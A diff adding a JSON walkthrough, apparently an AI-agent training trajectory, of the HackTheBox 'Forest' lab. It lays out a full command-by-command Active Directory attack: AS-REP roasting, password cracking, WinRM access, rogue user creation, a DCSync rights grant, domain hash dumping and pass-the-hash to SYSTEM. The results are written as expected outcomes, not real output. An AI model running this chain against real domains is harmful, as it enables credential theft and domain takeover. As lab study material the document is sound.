@@ -1,0 +1,167 @@
+{
+    "initial_prompt": "Objective: On the 'Forest' machine (target IP: 10.XX.XX.XX, domain: htb.local), a Windows Domain Controller on HackTheBox, gain initial access, escalate privileges, and retrieve the administrator's credentials.\nAttack Machine: Kali 2024.\nMethodology: Leverage Active Directory vulnerabilities, starting with no credentials. Key attack vectors include Kerberos pre-authentication issues and misconfigured permissions for privilege escalation.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Perform an initial fast scan of all TCP ports to identify open ports on the target machine. Save the output for reference.",
+            "command": "nmap --min-rate 5000 -p- -Pn -n -sS -T5 10.XX.XX.XX -oN nmap_all_ports.txt",
+            "result": "The nmap scan completes, identifying open ports. Output saved to `nmap_all_ports.txt`. Typical DC ports are expected: 53 (DNS), 88 (Kerberos), 135 (RPC), 389 (LDAP), 445 (SMB), 5985 (WinRM)."
+        },
+        {
+            "step_number": 2,
+            "thought": "Perform a detailed scan on the discovered open ports to identify service versions and run default scripts. This helps confirm the services and their configurations.",
+            "command": "nmap -sV -sC -p53,88,135,389,445,5985 10.XX.XX.XX -oN nmap_service_scan.txt",
+            "result": "Detailed service information obtained and saved to `nmap_service_scan.txt`. Confirms services like Kerberos, LDAP, SMB, and WinRM, indicating an Active Directory environment. Hostname 'FOREST' and domain 'htb.local' likely identified."
+        },
+        {
+            "step_number": 3,
+            "thought": "Enumerate domain users and gather more information about the Active Directory environment using enum4linux. Save the full output.",
+            "command": "enum4linux -A 10.XX.XX.XX > enum4linux_full_output.txt",
+            "result": "enum4linux queries SMB and RPC, saving comprehensive AD details to `enum4linux_full_output.txt`. The output includes a list of domain users (e.g., 'administrator', 'svc-alfresco', 'andy'), groups, and policies. The user 'svc-alfresco' is noted as a potential service account."
+        },
+        {
+            "step_number": 4,
+            "thought": "Create a file `domain-users.txt` containing a list of usernames identified (especially 'svc-alfresco') for AS-REP roasting.",
+            "command": "echo -e \"svc-alfresco\\nadministrator\\nandy\" > domain-users.txt",
+            "result": "`domain-users.txt` created with usernames `svc-alfresco`, `administrator`, and `andy`, each on a new line. This file will be used as input for GetNPUsers.py."
+        },
+        {
+            "step_number": 5,
+            "thought": "Attempt AS-REP roasting to find users with Kerberos pre-authentication disabled and retrieve their TGT hashes.",
+            "command": "impacket-GetNPUsers htb.local/ -usersfile domain-users.txt -outputfile hashes-domain-users.txt -dc-ip 10.XX.XX.XX -no-pass",
+            "result": "Successfully retrieved a TGT hash for 'svc-alfresco' because Kerberos pre-authentication is disabled for this account. The hash (e.g., `$krb5asrep$23$svc-alfresco@HTB.LOCAL:...`) is saved to `hashes-domain-users.txt`."
+        },
+        {
+            "step_number": 6,
+            "thought": "Ensure the `rockyou.txt` wordlist is available and uncompressed for password cracking. Kali typically stores it at `/usr/share/wordlists/rockyou.txt.gz`.",
+            "command": "sudo gunzip -kf /usr/share/wordlists/rockyou.txt.gz",
+            "result": "The command ensures `/usr/share/wordlists/rockyou.txt` is available. If it was gzipped, it's now uncompressed. The original `.gz` file is kept."
+        },
+        {
+            "step_number": 7,
+            "thought": "Crack the NTLM hash obtained for 'svc-alfresco' using John the Ripper and the rockyou.txt wordlist.",
+            "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes-domain-users.txt",
+            "result": "John the Ripper successfully cracks the hash. The password for 'svc-alfresco' is revealed as 's3rvice'."
+        },
+        {
+            "step_number": 8,
+            "thought": "Gain initial access to the target machine using the cracked credentials for 'svc-alfresco' via WinRM.",
+            "command": "evil-winrm -i 10.XX.XX.XX -u svc-alfresco -p s3rvice",
+            "result": "Successfully authenticated to the target machine. An interactive PowerShell prompt is obtained: `*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents>`. This is our initial foothold."
+        },
+        {
+            "step_number": 9,
+            "thought": "Read the user flag, typically located on the user's Desktop. This command is run within the evil-winrm session.",
+            "command": "cat C:\\Users\\svc-alfresco\\Desktop\\user.txt",
+            "result": "The content of `user.txt` is displayed, e.g., `HTB{...user_flag_content...}`."
+        },
+        {
+            "step_number": 10,
+            "thought": "Download the SharpHound executable to the attacker machine. SharpHound is used to collect data for BloodHound.",
+            "command": "wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe -O SharpHound.exe",
+            "result": "`SharpHound.exe` is downloaded to the current directory on the attacker's Kali machine. If this specific URL fails, manual download from the BloodHound GitHub releases page is an alternative."
+        },
+        {
+            "step_number": 11,
+            "thought": "Upload SharpHound.exe from the attacker machine to a temporary directory on the target machine using the active evil-winrm session.",
+            "command": "upload SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe",
+            "result": "File uploaded successfully. evil-winrm output: `[*] Uploaded SharpHound.exe ==> C:\\Windows\\Temp\\SharpHound.exe`."
+        },
+        {
+            "step_number": 12,
+            "thought": "Execute SharpHound on the target machine to collect Active Directory data. This command is run within the evil-winrm session.",
+            "command": "C:\\Windows\\Temp\\SharpHound.exe --CollectionMethod All -d htb.local --ZipFileName C:\\Windows\\Temp\\bloodhound_data.zip",
+            "result": "SharpHound runs and collects AD information, creating a ZIP file named `bloodhound_data.zip` in `C:\\Windows\\Temp\\` on the target machine."
+        },
+        {
+            "step_number": 13,
+            "thought": "Download the `bloodhound_data.zip` file from the target machine to the attacker machine using the evil-winrm session.",
+            "command": "download C:\\Windows\\Temp\\bloodhound_data.zip",
+            "result": "`bloodhound_data.zip` is downloaded to the attacker's current working directory. evil-winrm output: `[*] Downloaded C:\\Windows\\Temp\\bloodhound_data.zip ==> bloodhound_data.zip`."
+        },
+        {
+            "step_number": 14,
+            "thought": "Start the BloodHound GUI application on the attacker machine to analyze the collected data.",
+            "command": "bloodhound",
+            "result": "The BloodHound GUI application starts, ready to import and analyze data. (Neo4j database should be running)."
+        },
+        {
+            "step_number": 15,
+            "thought": "Analyze the collected data in BloodHound to find privilege escalation paths from the 'svc-alfresco' user to Domain Admins.",
+            "command": "echo \"Manual step: Import 'bloodhound_data.zip' into BloodHound. Run query 'Shortest Paths to Domain Admins from Owned Principals' (mark svc-alfresco as owned).\"",
+            "result": "BloodHound analysis reveals that 'svc-alfresco' is a member of 'Account Operators'. A potential path involves the 'Exchange Windows Permissions' group, which has 'WriteDACL' privileges on the domain object 'DC=htb,DC=local'. This can be abused to grant DCSync rights."
+        },
+        {
+            "step_number": 16,
+            "thought": "Create a new domain user. 'svc-alfresco' (as an Account Operator) has permissions to do this. This command is run within the evil-winrm session.",
+            "command": "net user m3n0sd0n4ld M3n0s.2021 /add /domain",
+            "result": "The command completes successfully. New domain user 'm3n0sd0n4ld' with password 'M3n0s.2021' is created in the 'htb.local' domain."
+        },
+        {
+            "step_number": 17,
+            "thought": "Add the newly created user 'm3n0sd0n4ld' to the 'Exchange Windows Permissions' group. 'svc-alfresco' (as Account Operator) can manage group memberships. This command is run within the evil-winrm session.",
+            "command": "net group \"Exchange Windows Permissions\" m3n0sd0n4ld /add /domain",
+            "result": "The command completes successfully. User 'm3n0sd0n4ld' is added to the 'Exchange Windows Permissions' group."
+        },
+        {
+            "step_number": 18,
+            "thought": "Download PowerView.ps1 to the attacker machine. PowerView is used for Active Directory enumeration and manipulation.",
+            "command": "wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O PowerView.ps1",
+            "result": "`PowerView.ps1` is downloaded to the current directory on the attacker's Kali machine."
+        },
+        {
+            "step_number": 19,
+            "thought": "Upload PowerView.ps1 from the attacker machine to the target machine using the evil-winrm session.",
+            "command": "upload PowerView.ps1 C:\\Windows\\Temp\\PowerView.ps1",
+            "result": "File uploaded successfully. evil-winrm output: `[*] Uploaded PowerView.ps1 ==> C:\\Windows\\Temp\\PowerView.ps1`."
+        },
+        {
+            "step_number": 20,
+            "thought": "Import the PowerView module into the current PowerShell session on the target machine. This command is run within the evil-winrm session.",
+            "command": "Import-Module C:\\Windows\\Temp\\PowerView.ps1",
+            "result": "PowerView module is imported. Cmdlets like `Add-DomainObjectAcl` are now available in the evil-winrm PowerShell session."
+        },
+        {
+            "step_number": 21,
+            "thought": "Create a secure string for 'm3n0sd0n4ld's password. This is needed for creating a PSCredential object. This command is run within the evil-winrm session.",
+            "command": "$SecPassword = ConvertTo-SecureString 'M3n0s.2021' -AsPlainText -Force",
+            "result": "The password 'M3n0s.2021' is converted to a secure string and stored in the `$SecPassword` variable."
+        },
+        {
+            "step_number": 22,
+            "thought": "Create a PSCredential object for the user 'm3n0sd0n4ld'. This command is run within the evil-winrm session.",
+            "command": "$Cred = New-Object System.Management.Automation.PSCredential('htb\\m3n0sd0n4ld', $SecPassword)",
+            "result": "A PSCredential object for 'htb\\m3n0sd0n4ld' is created and stored in the `$Cred` variable."
+        },
+        {
+            "step_number": 23,
+            "thought": "Grant DCSync rights to 'm3n0sd0n4ld'. This is done using 'm3n0sd0n4ld's credentials, leveraging its membership in 'Exchange Windows Permissions' which has WriteDACL on the domain. This command is run within the evil-winrm session.",
+            "command": "Add-DomainObjectAcl -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity \"htb\\m3n0sd0n4ld\" -Rights DCSync -Credential $Cred",
+            "result": "DCSync rights are successfully granted to the user 'htb\\m3n0sd0n4ld' on the domain 'htb.local'. No explicit output usually, but no errors means success."
+        },
+        {
+            "step_number": 24,
+            "thought": "Use secretsdump.py with 'm3n0sd0n4ld's credentials (which now has DCSync rights) to dump all NTLM hashes from the domain controller. Save output to a file.",
+            "command": "impacket-secretsdump htb.local/m3n0sd0n4ld:M3n0s.2021@10.XX.XX.XX -outputfile all_hashes.txt",
+            "result": "secretsdump successfully connects to the DC and dumps all domain account NTLM hashes, saving them to `all_hashes.txt`. The Administrator's hash (e.g., `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`) will be in this file."
+        },
+        {
+            "step_number": 25,
+            "thought": "Extract the NTLM hash for the 'Administrator' user from the dumped hashes file.",
+            "command": "grep 'Administrator:500' all_hashes.txt | cut -d: -f4",
+            "result": "The NTLM hash for the Administrator account is extracted and displayed (e.g., `31d6cfe0d16ae931b73c59d7e0c089c0`)."
+        },
+        {
+            "step_number": 26,
+            "thought": "Use the Administrator's NTLM hash to gain privileged access (SYSTEM shell) via pass-the-hash with psexec.py.",
+            "command": "impacket-psexec administrator@10.XX.XX.XX -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+            "result": "Successfully authenticated as Administrator using pass-the-hash. A command prompt with SYSTEM privileges is obtained on the target machine: `C:\\Windows\\system32>`."
+        },
+        {
+            "step_number": 27,
+            "thought": "Read the root flag, typically located on the Administrator's Desktop. This command is run within the psexec.py SYSTEM shell.",
+            "command": "type C:\\Users\\Administrator\\Desktop\\root.txt",
+            "result": "The content of `root.txt` is displayed, e.g., `HTB{...root_flag_content...}`. Challenge completed."
+        }
+    ]
+}
